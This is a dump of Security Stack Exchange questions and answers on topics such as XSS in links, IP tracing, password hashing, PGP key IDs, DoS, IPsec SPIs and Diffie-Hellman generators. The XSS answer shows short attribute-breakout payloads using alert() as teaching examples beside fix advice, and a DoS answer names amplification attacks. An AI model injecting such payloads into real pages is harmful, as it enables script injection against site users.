<pre><code>&lt;a href=""&lt;script&gt;alert(8007)&lt;/script&gt;""&gt;Click Me&lt;/a&gt;
</code></pre>

<p>What I am trying to determine is, what is the chance that a browser, even an older one would execute this JavaScript located withing the HREF?</p>

<p>I understand that this value needs to be encoded before being written to the page, etc.  This question is strictly around the threat level of the statement above and the chance a browser will execute the JavaScript while creating the page.</p>

<p>I am finding more difficult to test xss vulnerabilities now that browsers are doing a better job of detecting and protecting against them.</p>
","<p>I do not know of any browser that will execute Javascript for the particular example you mention.  I consider it highly unlikely that any browser will execute Javascript in this situation.  This is not related to newer protections in modern browsers.</p>

<p><em>However</em>, I suspect you are still vulnerable.  If an attacker can insert markup into an href attribute, it probably means they can insert anything they want.  And if an attacker can insert anything they want, then bad things happen.  For instance, the attacker can make it look like this:</p>

<p><code>&lt;a href=""javascript:alert(8007)""&gt;Click me&lt;/a&gt;</code></p>

<p>And <em>that</em> is bad news, because browsers <em>will</em> execute Javascript in that situation.  So this is a way that an attacker could try to exploit the XSS vulnerability.</p>

<p>Also, if there are no quotes around the value of the href parameter, there will be other ways to attack your system.  For example, <code>&lt;a href=blah onclick=alert(8007)&gt;Click me&lt;/a&gt;</code> is bad news and will execute Javascript.  (Thanks to @AviD for pointing this out.)  Even if there <em>are</em> quotes around the value of the href parameter, if the attacker completely controls the value placed in there, the attacker may be able to supply his own quotes to break out of the attribute and then cause trouble, like this: <code>&lt;a href=""blah"" onclick=alert(8007) ignoreme=""blah""&gt;Click me&lt;/a&gt;</code>.  (Here the attacker inserted the value <code>blah"" onclick=alert(8007) ignoreme=""blah</code>.)  There are likely more examples like this.</p>

<p><strong>The bottom line.</strong> I definitely recommend you fix the XSS vulnerability.  I suspect you are at risk.  Bad guys have developed a large number of surprising and clever ways of exploiting XSS vulnerabilities which you can't be expected to know about; as a result, if you have a XSS vulnerability, your best bet is to fix it preemptively and not take any chances.</p>

<p><strong>Fixing the flaw.</strong>  To fix the flaw, I recommend that you use a combination of validation and output escaping.  First, ensure the URL's protocol handler is one of a whitelisted set (e.g., <code>http</code>, <code>https</code>, <code>ftp</code>, <code>mailto</code>).  Then, apply HTML escaping to escape all angle brackets, quotes, and ampersands before inserting the URL into the markup, and make sure the attribute value is surrounded by quotes.</p>

<p>The exact way of implementing this fix is language-dependent, but you can find a lot of information on the web about how to avoid XSS flaws in this situation.  For instance, after ensuring the dynamic value contains a safe protocol, in PHP you could use <code>htmlspecialchars(., ENT_QUOTES)</code> to escape angle brackets, quotes, and ampersands.  Or you could use <a href=""http://code.google.com/p/owasp-esapi-php/"" rel=""nofollow"">OWASP ESAPI</a>, which provides <a href=""https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#RULE_.235_-_URL_Escape_Before_Inserting_Untrusted_Data_into_HTML_URL_Parameter_Values"" rel=""nofollow"">support for exactly this situation</a>. </p>

<p>To learn more, I can recommend <a href=""http://coding.smashingmagazine.com/2010/01/14/web-security-primer-are-you-part-of-the-problem/"" rel=""nofollow"">a good introduction for web developers</a>.  This is just an introduction and you will need to read more, but it will help you be aware of the threats at a high level.  OWASP has some good resources on defending against XSS; for instance, they have a <a href=""https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet"" rel=""nofollow"">useful cheatsheet for how to use OWASP ESPI to avoid XSS vulnerabilities</a>.</p>
","11989"
"How are IP addresses traced?","18711","","<p>Let say I have done something harmful to some computer.</p>

<p>I am on wifi at my hostel, so for that session I have some IP assigned. Now, since tomorrow I will connect again to wifi and get a new IP Address, how will they (FBI or anyone) trace me?</p>

<p>I read this <a href=""http://www.certmag.com/read.php?in=3559"" rel=""nofollow"">article</a>, but I am not convinced.</p>

<p>I want to know if it is really possible to trace the computer, if it was assigned to a dynamic IP.</p>

<p>For example, let say I was assigned 192.168.1.5 for today and I performed some illegal activity on someone else's computer. Tomorrow when I connect to the wifi of my hostel, the IP will be different. So how will they trace my computer? Do they trace by MAC address, does the ISP record MAC for every IP assigned?</p>
","<p><strong>Yes and no.</strong></p>

<p>Yes it can be traced to your ISP, ergo to the geographical area in which your ISP exists. This is more often that not where you live. But no, it can't be easily and directly traced to you.</p>

<p>It is <a href=""http://thomas.loc.gov/cgi-bin/bdquery/z?d108%3ah.r.03754%3a"">required by law</a> to provide correct information when reserving Internet resources (domain names, IP addresses), those information are stored in a publicly accessible <a href=""https://en.wikipedia.org/wiki/Whois"">WHOIS database</a>. Since your ISP is the one who reserved a stack of IP addresses, they usually are linked to it. If you are assigned an IP address dynamically and you lookup your IP address in WHOIS database, it leads to your ISP.</p>

<p>When the authorities want to trace you even more (beyond just the ISP level) they simply provide a legal request (such as <a href=""https://en.wikipedia.org/wiki/Subpoena"">subpoena</a>) to your ISP with the time of your activity. Your ISP simply looks up their database and see who was given that IP address at the that time. After they know it's you, they simply hand over your registration information (Full name, address, etc.).</p>

<p>In the case of static IP addresses, things are a little bit different. Depending on the jurisdiction and possibly your ISP policies, your statically assigned IP address maybe linked directly to your identity and thus can be looked up in a WHOIS database. Some ISPs provide a <a href=""https://en.wikipedia.org/wiki/Domain_privacy"">domain-privacy</a>-like service for your static IP, in which they keep the IP publicly linked directly to them. Again, in this case, a legal request can be filed and the ISP will hand out your real information.</p>

<p>In your question you mentioned something about connecting to WiFi again and getting a new IP address. Even though you're getting a new <em>local</em> IP address, your public IP address is still the same. That's because almost all home routers and WiFi access points create a <a href=""https://en.wikipedia.org/wiki/Network_address_translation"">NAT</a> by which they separate your home network from the outside world, and no matter what IP address you have inside the local network, the world still sees the same public IP address.</p>
","35809"
"What is a good analogy to explain to a layman why passwords should be hashed?","18697","","<p>Note: This is not an actual situation I'm currently in.</p>

<p>Assume your boss is one of those old-fashioned computer-illiterate managers and wants to store the passwords in plaintext to simplify development. You get 5 minutes to explain the point of hashing passwords. You also know from experience that your boss can be swayed by a good analogy. What analogy would you use to explain your boss that passwords should be hashed?</p>
","<h1>The Short Answer</h1>

<p>The short answer is: <strong>""So you don't get hit with a <a href=""http://www.eweek.com/c/a/Security/LinkedIn-Faces-5-Million-Lawsuit-After-Password-Breach-850895/"" rel=""noreferrer"">$5 million class-action lawsuit</a>.""</strong> That should be reason enough for most CEOs. Hashing passwords is a lot cheaper.</p>

<p>But more importantly: simply hashing the passwords as you suggested in your question isn't sufficient. You'll still get the lawsuit. You need to do more. </p>

<p><em>Why</em> you need to do more takes a bit longer to explain. So let's take the long route for a moment so that you understand what you're explaining, and then we'll circle around for your 5-minute synopsis.</p>

<h1>Hashing is just the beginning</h1>

<p>But let's start with that. Say you store your users' passwords like this:</p>

<pre><code># id:user:password
1:alice:pizza
2:bob:passw0rd
3:carol:baseball
</code></pre>

<p>Now, let's say an attacker manages to get more access to your system than you'd like. He's only there for 35 seconds before you detect the issue and close the hole. But in those 35 seconds he managed to snag your password database. Yes, you made a security mistake, but you've fixed it now. You patched the hole, fixed the code, updated your firewall, whatever it may be. So everything is good, now, right? </p>

<p><em>Well, no, he has your password database.</em></p>

<p>That means that he can now impersonate every user on your system. Your system's security is destroyed. The only way to recover is to start over with NEW password database, forcing everyone to change their password <em>without</em> using their existing password as a valid form of identification. You have to contact them out-of-band through some other method (phone, email, or something) to verify their identity to re-create their passwords, and in the mean time, your whole operation is dead in the water.</p>

<p>And what if you didn't see him steal the password database? In retrospect, it's quite unlikely that you would actually see it happen. The way you probably find out is by noticing unusual activity on multiple users' accounts. Perhaps for months it's as if your system has no security at all and you can't figure out why. This could ruin your business.</p>

<h1>So we hash</h1>

<p>Instead of storing the password, we store a <em>hash</em> of the password. Your database now looks like this:</p>

<pre><code># id:user:sha1
1:alice:1f6ccd2be75f1cc94a22a773eea8f8aeb5c68217
2:bob:7c6a61c68ef8b9b6b061b28c348bc1ed7921cb53
3:carol:a2c901c8c6dea98958c219f6f2d038c44dc5d362
</code></pre>

<p>Now the only thing you store is an opaque token that can be used to <em>verify</em> whether a password is correct, but can't be used to <em>retrieve</em> the correct password.</p>

<p>Well, almost. Google those hashes, I dare you.</p>

<p>So now we've progressed to 1970's technology. Congratulations. We can do better.</p>

<h1>So we salt</h1>

<p>I spent a long time answering the question as to why to salt hashes, including examples and demonstrations of how this works in the real world. I won't re-hash the hashing discussion here, so go ahead and read the original:</p>

<p><a href=""https://security.stackexchange.com/a/51983/2264"">Why are salted hashes more secure?</a></p>

<p>Pretty fun, eh? OK, so now we know that we have to salt our hashes or we might as well have never hashed the passwords to begin with. Now we're up to 1990's technology. We can still do better.</p>

<h1>So we iterate</h1>

<p>You noticed that bit at the bottom of the answer I linked above, right? The bit about bcrypt and PBKDF2? Yeah, it turns out that's really important. With the speed at which hardware can do hashing calculations today (<a href=""https://en.bitcoin.it/wiki/Mining_hardware_comparison"" rel=""noreferrer"">thank you, bitcoin!</a>), an attacker with off-the-shelf hardware can blow through your whole salted, hashed password file in a matter of hours, calculating billions or even trillions of hashes per second. You've got to slow them down.</p>

<p>The easiest way to slow them down is to just make them do more work. Instead of calculating one hash to check a password, you have to calculate 1000. Or 100,000. Or whatever number suits your fancy. You can also use <em>scrypt</em> (""ess-crypt""), which not only requires a lot of CPU power, but also a lot of RAM to do the calculation, making the dedicated hardware I linked above largely useless.</p>

<p>This is the current state-of-the-art. Congratulations and welcome to <em>today's</em> technology.</p>

<h1>Are we done?</h1>

<p>So now what happens when the attacker grabs your password file. Well, now he can pound away at it offline instead of making online guess attempts against your service. Sadly, a fair chunk of your users (4% to 12%) will have used the password ""123456"" or ""password"" unless you actively prevent them from doing so, and the attacker will try guessing these first.</p>

<p>If you want to keep users safe, don't let them use ""password"" as their password. Or any of the other top 500, for that matter. <a href=""https://github.com/dropbox/zxcvbn"" rel=""noreferrer"">There's software out there</a> to make accurate password strength calculation easy (and free).</p>

<p>But also, multi-factor authentication is never a bad call. It's <a href=""http://en.wikipedia.org/wiki/HMAC-based_One-time_Password_Algorithm"" rel=""noreferrer"">easy</a> for you to add to any project. So you might as well.</p>

<h1>Now, Your 5 Minutes of Glory</h1>

<p>You're in front of your boss, he asks you why you need to <strong>use PBKDF2 or similar</strong> to hash your passwords. You mention the LinkedIn class-action suit and say, ""This is the minimum level of security <em>legally</em> expected in the industry. Anything less is literally negligence."" This should take much less than 5 minutes, and if your boss isn't convinced, then he wasn't listening.</p>

<p>But you could go on: ""The cost of implementing hashing technology is negligible, while the cost of <em>not</em> implementing it could be in the millions or higher."" and ""In the event of a breach, a properly-hashed database allows you to position yourself as a well-run security-aware organization, while a database improperly hashed is a very public embarrassment that, as history has shown many times over, will <em>not</em> be ignored or overlooked in the slightest by the media.""</p>

<p>If you want to get technical, you can re-hash the above. But if you're talking to your boss, then you should know better than that. And analogies are much less effective than just showing the real-life effects that are perfectly visible with no sugar-coating necessary.</p>

<p><strong>You don't get people to wear safety gloves by recounting a good analogy. Instead you put some lunch meat in the beaker and when it explodes in green and blue flames you say, ""that's what will happen to your finger.""</strong></p>

<p>Use the same principle here.</p>
","63421"
"Extracting the PGP keyid from the public key file","18696","","<p>Is there a way via an CLI tool or some kind of API to extract the PGP key ID from the PGP public key block?</p>

<p>I found the hexa value of the key in the binary file, but I guess the position is based on the key kind/size.</p>

<p>Basically, I have the base64 formatted public key and I would like to retrieve the key ID from it, without importing it with GnuPG.</p>
","<p><a href=""http://tools.ietf.org/html/rfc4880"" rel=""nofollow"">RFC 4880</a> on OpenPGP message format talks about how to calculate key ID from public key. </p>

<p>Excerpts from <a href=""http://tools.ietf.org/html/rfc4880#section-12.2"" rel=""nofollow"">section 12.2</a>:</p>

<blockquote>
  <p>For a V3 key, the eight-octet Key ID consists of the low 64 bits of the public modulus of the RSA key.</p>
</blockquote>

<p>And for V4 keys:</p>

<blockquote>
  <p>A V4 fingerprint is the 160-bit SHA-1 hash of the octet 0x99, followed by the two-octet packet length, followed by the entire Public-Key packet starting with the version field.  The Key ID is the low-order 64 bits of the fingerprint.</p>
</blockquote>

<p>You can easily parse the last 64 bits from the base64 encoded public keys, which is the key ID for the corresponding public key. </p>
","43349"
"Can someone launch a DOS attack on my IP","18608","","<p>Suppose, I have a static IP on my PC and is known to others. None of my softwares listen for remote connection. Is it still possible for someone to DOS attack me in such cases? If yes, how it is possible?</p>
","<p>DDoS is <em>not</em> specific to HTTP or any service, a Distributed Denial of Service simply means that are multiples sources for the attacker trying to make it so your network connection is non functional.</p>

<p>A denial of service could happen by making your system crash or become unresponsive (if its not on, it won't respond),  by filling up all your bandwidth (your pipe), or most simply by physically severing the connection. Distributed denial of services attacks can be started by using multiple clients the attacker controls or by tricking innocent clients to participate.</p>

<p>Refer to the <a href=""http://en.wikipedia.org/wiki/Osi_model#Description_of_OSI_layers"">OSI Model</a> or the <a href=""http://en.wikipedia.org/wiki/Internet_protocol_suite#Abstraction_layers"">TCP Layers</a>. HTTP is going to be at the application layer, but you can attack at any layer to cause denial of service.</p>

<hr>

<p>A very simple example of a lower level DDoS attack, would be the <a href=""http://en.wikipedia.org/wiki/Smurf_attack"">smurf attack</a>. In this attack you take advantage of a broadcast message to all stations on network responding to the spoofed source target, which is the victim.</p>

<p>A similar attack, is the <a href=""https://www.us-cert.gov/ncas/alerts/TA13-088A"">DNS amplification attack</a>, where you trick a bunch of DNS servers into giving unsolicited responses to the victim.</p>

<p>Alternatively, if the attacker controls a botnet they can just send any type of unsolicited traffic and clog up your pipe or clog up your workstation with requests, pings, etc. </p>
","56696"
"Could Nmap scan switches/routers","18601","","<p>Nmap can scan and sometimes successfully detect the running OS in the remote host. However, can nmap scan routers and switches? Most of them use an embedded system.</p>
","<p>Don't forget other network protocols, routing protocols, Cisco Discovery Protocol, SNMP, etc.., there's a ton of information on these types of devices and ""Yes"" you definitely can identify them and their OS versions using nmap. Don't forget about nmap's scripting options either, you could write a .NSE just for this if you wanted (there may already be one for that matter). SNMP and CDP will give you the exact OS version information if you have access to them. Even SSL certificates on these devices may leak versioning information. Hope this helps.</p>
","13889"
"What is the most secure way for two people to communicate?","18580","","<p>There are various services on the internet that offer secure communications. Typically in the past if I want to share some sensitive information with someone, I  will do so over a <a href=""https://crypto.cat/"">Cryptocat</a> chat session, <a href=""https://privnote.com/"">Privnote</a>, or through an IRC channel set up on a ""no log"" VPN. </p>

<p>Am I looking in the right places when it comes to the services I use to keep my anonymity? Are there any flaws in these technologies? And what quite simply, what else is out there that you would recommend?</p>

<p>Edit: In reply to @Graham Hill, my immediate priority would be to first ensure that the information I am relaying gets to the person I am talking to, and only to that person. Obviously once they have it, it's up to their discretion on how they're going to store it, I'm more speaking in terms of making sure that the infrastructure is set up so that the only cause for data being leaked would be improper storage of the information by either party.</p>
","<p>Before looking at specific technological solutions, you need to do some thinking about your threat model. Who is the ""enemy""? What do they want, and what resources do they have?</p>

<p>For example, keeping the content of the communications secret is one thing, hiding the fact that you are communicating is another, verifying the identity of the other person is yet a third.</p>

<p>And keeping secrets from your mom is one thing, keeping secrets from the Politburo Standing Committee of the Communist Party of China is another.</p>

<p>You also need to understand your resources. Can you establish a short-term secure channel to the other party (so you can exchange keys)? Can you use cut-outs? Can you arrange to use a different computer each time you communicate? </p>
","26692"
"Understanding the details of SPI in IKE and IPsec","18544","","<p>I'm currently learning IKE and IPsec for an exam. I have a lot of information on how Security Parameter Indexes (SPI) are used in both protocols, but I'm having some problems figuring out the coherence. </p>

<p>First, in IKE, both parties share their SPI with the respective other party. I guess these will be the both SPIs used for the two Security Associations (SA), because each SA is only unidirectional, is that right? </p>

<p>Then, in the IPsec chapter, things start to get more complicated. Reading different sources, I have a theory how this works exactly, but I'm not sure if my theory is right. RFC 4301 says:</p>

<blockquote>
  <p>SPI: An arbitrary 32-bit value that is used by a receiver to identify the SA to which an incoming packet should be bound. [...]</p>
</blockquote>

<p>In IKE, each party shares an SPI with the other party. Does this mean, that the SPI a party sets is the SPI used for the incoming SA, not the outgoing one?</p>

<p>This would explain another question I have regarding registrating a new SA in the SA-Database (SAD)</p>

<ul>
<li><code>SAD_ADD</code> is used when IKE already knows which SPI it wants to use for an SA. </li>
<li><code>SAD_GETSPI</code> is used to get a non-used SPI (here the SAD returns a non-used SPI, because of course it knows which SPIs are used and which aren't). Additionally it already inserts an incomplete SA. The <code>SAD_UPDATE</code> is then used to to set the missing SPI to the previously inserted SA. </li>
</ul>

<p>Additionally my notes say that the initiator uses the <code>SAD_ADD</code> method while the responder uses <code>SAD_GETSPI</code> and <code>SAD_UPDATE</code>. This would make sense, if the responder is the one creating an SPI, and the initiator only adds this SPI to his database. This only has to be unique for him together with the responder's IP address. Is my theory right?</p>

<p>However I don't understand why the <code>SAD_UPDATE</code> method is used. For me this sounds redundant:</p>

<ul>
<li><code>SAD_GETSPI</code>: ""I want to insert an SA <code>x</code>, which SPI can I use? Answer: Here is an unused SPI: <code>y</code>. Additionally, I have already inserted <code>x</code> in my Database, just tell me which SPI I should insert.""</li>
<li><code>SAD_UPDATE</code>: ""Please update SA <code>x</code>, set SPI to <code>y</code>.""</li>
</ul>
","<p>Security Parameter Indexes (SPIs) can mean different things when referring to IKE and IPsec Security Associations (SAs):</p>

<ul>
<li><p>For <strong>IKE</strong> two 64-bit SPIs uniquely identify an IKE SA. With <a href=""http://tools.ietf.org/html/rfc5996"" rel=""noreferrer"">IKEv2</a> the <code>IKE_SA_INIT</code> request will only have the locally unique initiator SPI set in the IKE header, the responder SPI is zero. The responder will set that to a likewise locally unique value in its response. The two SPIs will only change when the IKE SA is rekeyed.</p>

<p>The two fields in the IKE header that are now called Initiator/Responder SPI were previously called Initiator/Responder Cookie in <a href=""http://tools.ietf.org/html/rfc2408#section-3.1"" rel=""noreferrer"">RFC 2408</a> (ISAKMP). This could be confusing as IKEv2 uses COOKIE notification payloads to <a href=""http://tools.ietf.org/html/rfc5996#section-2.6"" rel=""noreferrer"">thwart denial of service attacks</a>.</p></li>
<li><p>For <strong>IPsec</strong> a 32-bit SPI semi-uniquely identifies an IPsec SA. Since these SAs are unidirectional the ESP/AH header contains only the SPI of the destination's inbound SA (unlike the IKE header which always contains both SPIs). Since the SPIs are locally unique this and the destination address is usually enough to uniquely identify an SA. But it could be problematic e.g. if two clients behind the same NAT allocate the same local SPI when they connect to the same VPN gateway. The combination of SPI and destination address would be the same on the public side of the NAT, which is why <a href=""http://tools.ietf.org/html/rfc3948"" rel=""noreferrer"">UDP encapsulation</a> is required. The UDP ports allow the NAT to direct the inbound packets to the right client. Likewise, the gateway has to take measures to differentiate the two SAs so that the right SA is used when sending traffic to each client.</p></li>
</ul>

<blockquote>
  <p>Does this mean, that the SPI a party sets is the SPI used for the incoming SA, not the outgoing one?</p>
</blockquote>

<p>Yes, each peer sends the SPI of its inbound SA to the other peer.</p>

<blockquote>
  <p>Additionally my notes say that the initiator uses the <code>SAD_ADD</code> method while the responder uses <code>SAD_GETSPI</code> and <code>SAD_UPDATE</code>.</p>
</blockquote>

<p>The process of establishing an IPsec SA using e.g. a <code>CREATE_CHILD_SA</code> exchange in IKEv2 could roughly be visualized like this:</p>

<pre><code>Initiator                               Responder
SAD_GETSPI (inbound SA)  -----------&gt;   {select algorithms and derive keys}
                                        SAD_ADD (outbound SA)
                                        SAD_GETSPI (inbound SA)
{derive keys}            &lt;-----------   SAD_UPDATE (inbound SA) 
SAD_UPDATE (inbound SA)
SAD_ADD (outbound SA)
</code></pre>

<ol>
<li>The initiator sends the SPI of its inbound SA together with a proposal of cryptographic algorithms and, if perfect forward secrecy is used, its Diffie-Hellman factor, to the responder.</li>
<li>The responder selects suitable algorithms and derives the keys (optionally using DH) and proceeds installing the SAs.</li>
<li>Then it returns its inbound SPI together with the selected algorithms (and optionally its DH factor) to the initiator, which is now able to install the SAs on its side.</li>
</ol>

<p>Additionally, the two peers exchange traffic selectors that specify the network traffic that is to be covered by the established SA.</p>

<blockquote>
  <p><code>SAD_UPDATE</code>: ""Please update SPI x, set SPI to y.""</p>
</blockquote>

<p>That's not what <code>SAD_UPDATE</code> does. It actually does not change the SPI at all, but rather all (or some) of the other aspects of the SA, and these are mainly the encryption/integrity algorithms and keys (but may also include other things, like <a href=""http://tools.ietf.org/html/rfc3948"" rel=""noreferrer"">encapsulation</a> or the anti-replay window size). </p>

<p>The reason you usually want to call <code>SAD_GETSPI</code> and <code>SAD_UPDATE</code> instead of simply <code>SAD_ADD</code> for inbound SAs (even on the responder, where all the information would be available) is that the SAD is usually managed by the operating system's kernel, while IKE daemons operate in userland. And therefore, calling <code>SAD_GETSPI</code> will ensure that the SPI is actually locally unique. Which might not be guaranteed if e.g. two IKE daemons (for IKEv1 and IKEv2) or even tools to manually manage SAs (like <code>ip xfrm</code> or <code>setkey</code>) are used concurrently on a system.</p>

<p>But it is imaginable that on some systems there could be a simplification that would allow a responder to call <code>SAD_ADD</code> without specifying an SPI, and the SAD would then allocate one, install the SA, and return the new SPI.  But that would require special handling for this particular case by the keying daemon (otherwise it could simply call <code>SAD_ADD</code> for outbound SAs and <code>SAD_GETSPI/SAD_UPDATE</code> for inbound SAs, no matter if it does so as initiator or responder).</p>

<p><a href=""http://tools.ietf.org/html/rfc2367"" rel=""noreferrer"">RFC 2367</a> (PF_KEYv2) provides more information on these operations.</p>
","56472"
"Unsolicited Password Request from Facebook","18539","","<p>Today I have received 3 emails to my three different addresses, one with Google, one with MSN, and one with my company. All emails were sent from <code>password+kjdmiikvhppi at facebookmail.com</code> email address. Content are same, as if I had requested a password change. I have never requested for such a thing, and more strangely, I haven't even logged onto Facebook today. I am confused about what should be done next.</p>

<p>Source of one of such messages with <a href=""https://en.wikipedia.org/wiki/Personally_identifiable_information"" rel=""nofollow"">PII</a> removed:</p>

<pre><code>Delivered-To: xxxxxxxxxx@xxxx.com
Received: by 10.112.127.193 with SMTP id ni1csp8990lbb;
        Wed, 15 May 2013 04:01:05 -0700 (PDT)
X-Received: by 10.49.35.132 with SMTP id h4mr32118109qej.29.1368615664824;
        Wed, 15 May 2013 04:01:04 -0700 (PDT)
Return-Path: &lt;password+kjdmiikvhppi@facebookmail.com&gt;
Received: from mx-out.facebook.com (outmail010.ash2.facebook.com. [66.220.155.144])
        by mx.google.com with ESMTP id k3si579007qch.125.2013.05.15.04.01.04
        for &lt;xxxx@xxxxx.com&gt;;
        Wed, 15 May 2013 04:01:04 -0700 (PDT)
Received-SPF: pass (google.com: domain of password+kjdmiikvhppi@facebookmail.com designates 66.220.155.144 as permitted sender) client-ip=66.220.155.144;
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of password+kjdmiikvhppi@facebookmail.com designates 66.220.155.144 as permitted sender) smtp.mail=password+kjdmiikvhppi@facebookmail.com;
       dkim=pass header.i=@facebookmail.com;
       dmarc=pass (p=REJECT dis=none) d=facebookmail.com
Return-Path: &lt;password+kjdmiikvhppi@facebookmail.com&gt;
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=facebookmail.com;
    s=s1024-2011-q2; t=1368615663;
    bh=VxEamRxXZ6SfTLvhRMIa5Ql8ijPP2ciAPaWmEiPqZkE=;
    h=Date:To:From:Subject:MIME-Version:Content-Type;
    b=nP3TizJu9pZ3rvqTrtWU5t3pzCKSjlApuBjoloWjH/aBI/9GAqAkhARhdNhtKOhLU
     G3wm9ECZn+RwqEYh3v8PmQbhEoLnKDOMbm7LCh8o0yFrRu4uPWHzb+TBfnJUvG/SAM
     Pb/CfjAA5fqFbEuZxvBRDXOoTLYJ/H9i6uJPY3Yg=
Received: from [10.198.241.35] ([10.198.241.35:65219])
    by smout014.ash4.facebook.com (envelope-from &lt;password+kjdmiikvhppi@facebookmail.com&gt;)
    (ecelerity 3.6.0.37104 r(/root/Platform:develop)) with ECSTREAM
    id 6A/27-01069-FEA63915; Wed, 15 May 2013 04:01:03 -0700
X-Facebook: from zuckmail ([MTI3LjAuMC4x]) 
    by www.facebook.com with HTTP (ZuckMail);
Date: Wed, 15 May 2013 04:01:03 -0700
To: xxxxxx@xxxxx.com
From: ""Facebook"" &lt;password+kjdmiikvhppi@facebookmail.com&gt;
Reply-to: Facebook &lt;password+kjdmiikvhppi@facebookmail.com&gt;
Subject: You requested a new Facebook password
Message-ID: &lt;ca2180dd82544c68dd6601660d9cc9a9@www.facebook.com&gt;
X-Priority: 3
X-Mailer: ZuckMail [version 1.00]
Errors-To: password+kjdmiikvhppi@facebookmail.com
X-Facebook-Notify: password_reset; mailid=
X-FACEBOOK-PRIORITY: 1
X-Auto-Response-Suppress: All
MIME-Version: 1.0
Content-Type: multipart/alternative;
    boundary=""b1_ca2180dd82544c68dd6601660d9cc9a9""


--b1_ca2180dd82544c68dd6601660d9cc9a9
Content-Type: text/plain; charset=""UTF-8""
Content-Transfer-Encoding: quoted-printable

Hi xxxxxxxx,

You recently asked to reset your Facebook password. Go here to change your =
password:=C2=A0https://www.facebook.com/recover/code?u=xxxxxxx&amp;n=
=xxxxx

Alternatively, you can enter the following password reset code:

xxxxx

Didn't request a new password? Let us know here:=C2=A0https://www.facebook=
.com/login/recover/disavow_reset_email.php?n=xxxxxxx&amp;id=xxxxxxx

Thanks,
The Facebook Team

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
This message was sent to xxx@msn.com at your request.
Facebook, Inc., Attention: Department 415, PO Box 10005, Palo Alto, CA =
94303
</code></pre>

<p><strong>Edit</strong>
I hope it is harmless and I will be able to take @adnan's and @graham's answers as final.</p>
","<p><strong>Relax, no need to worry</strong>. The email address <code>password+kjdmiikvhppi@facebookmail.com</code> does seem to be authentic. It <em>could</em> be spoofed, but if it were spoofed it would be very likely moved automatically to the Junk or Spam folder. Of course, it <em>is</em> possible that the email is spoofed and it wasn't caught in the spam filter, but I personally think it's not very likely.</p>

<p>So, there are two explanations for this, one is <a href=""https://www.facebook.com/help/226272054050348/"" rel=""nofollow"">the official Facebook explanation</a>:</p>

<blockquote>
  <p>it's likely that someone accidentally entered your email address or
  username when attempting to log in to their account. This often
  happens if you have a popular username or email address. <strong>As long as
  you don't click the link contained in the email, no action will be
  taken</strong> and your account will remain secure.</p>
</blockquote>

<p>The other possibility is that someone is trying to hijack your Facebook account. Again, no need to worry, just follow these steps:</p>

<ol>
<li><p><strike>Ignore the email</strike>. Now that I see that the links are authentic, I think it's a good idea to click on the link next to <em>""Didn't request a new password? Let us know here""</em> , this way you'll be able to report this to Facebook.</p></li>
<li><p>Follow <a href=""https://www.facebook.com/help/379220725465972/"" rel=""nofollow"">Facebook's security guidelines</a>.</p></li>
<li><p>Make sure you have a strong password for your email account (it's also not a bad idea to change it)</p></li>
</ol>

<p><strong>Update:</strong> Now that you posted the message source, I can be even more confident that it is indeed an authentic email from Facebook and my answer is correct. The headers seem to be legitimate and the links all lead to the real Facebook website. </p>
","35968"
"Bad practice to have a ""god"" password?","18526","","<p>Is it bad security practice to have a password that will allow you to access any user account on a website for support purposes?  The password would be stored in a secure manner and would be super complex.  Huge mistake?</p>
","<p>This sounds very much like an ""Administrator"" account, which typically otherwise has unlimited access to the things that it's the administrator of.</p>

<p>The security implications of an admin account are pretty well-understood, as are the best practices. I won't go in to all the details, but your implementation breaks with best-practice on one key feature: traceablity.</p>

<p>You want to be able to tell who did what, <strong>especially</strong> when it comes to administrators. If an admin can log in to my account using his password, then there's no way for an auditor after-the-fact to determine what was done by me versus what was done by the admin.</p>

<p>But if instead the admin logs in to his OWN account with his super-secure password, then through the access he has through his own account performs some action I could have done as well -- well then now we can have a log telling who did what. This is pretty key when the manure hits the fan. And even more so when one of the admin accounts get compromised (which it <em>will</em>, despite your best efforts).</p>

<p>Also, say the business grows and you need 2 admins. Do they share the superawesome password? NO NO NO. They both get their own admin accounts, with separate tracing and logging and all that. Now you can tell WHICH admin did what. And, most importantly, you can close one of the accounts when you fire one of the admins for stealing the donuts. </p>
","51121"
"What is the difference between Diffie Hellman generator 2 and 5?","18478","","<p>Generating Diffie Hellman parameters in OpenSSL can be done as follows:</p>

<pre><code>$ openssl dhparam -out dh2048.pem 2048
Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time 
[...]
</code></pre>

<p>The ""generator 2"" caught my attention there. It appears I can choose between generator 2 and 5 as indicated by the manpage (<code>man dhparam</code>):</p>

<blockquote>
<pre><code>-2, -5
   The generator to use, either 2 or 5. 2 is the default. If present then the input file
   is ignored and parameters are generated instead.
</code></pre>
</blockquote>

<ul>
<li>What is generator 2 and 5?</li>
<li>How does choosing 5 instead of 2 affect the security?</li>
<li>Is this specific to OpenSSL?</li>
</ul>
","<p><a href=""http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange"">Diffie-Hellman</a> works in a subgroup of integers modulo a prime <em>p</em>. Namely, you have a generator <em>g</em>, which is a conventional integer modulo <em>p</em>. That generator has an order <em>r</em> which is the smallest positive integer such that <em>g<sup>r</sup> = 1</em> mod <em>p</em>. The two systems who engage in DH choose private keys <em>a</em> and <em>b</em> respectively as integers in a given range, and the corresponding DH public keys (which they exchange over the wire) are <em>g<sup>a</sup></em> mod <em>p</em> and <em>g<sup>b</sup></em> mod <em>p</em>.</p>

<p>DH is secure as long as:</p>

<ul>
<li><em>p</em> is ""proper"": big enough (at least 1024 bits) and not produced with a ""special structure"" which makes <a href=""http://en.wikipedia.org/wiki/Discrete_logarithm"">discrete logarithm</a> easy. A randomly generated prime of the right size will be fine.</li>
<li>The biggest prime divisor of <em>r</em> has size at least <em>2k</em> bits, when targeting a security level of ""<em>k</em> bits"". Basically, the biggest prime divisor of <em>r</em> should be a prime integer of size at least 160 bits (200 bits or more would be preferred by today's standards).</li>
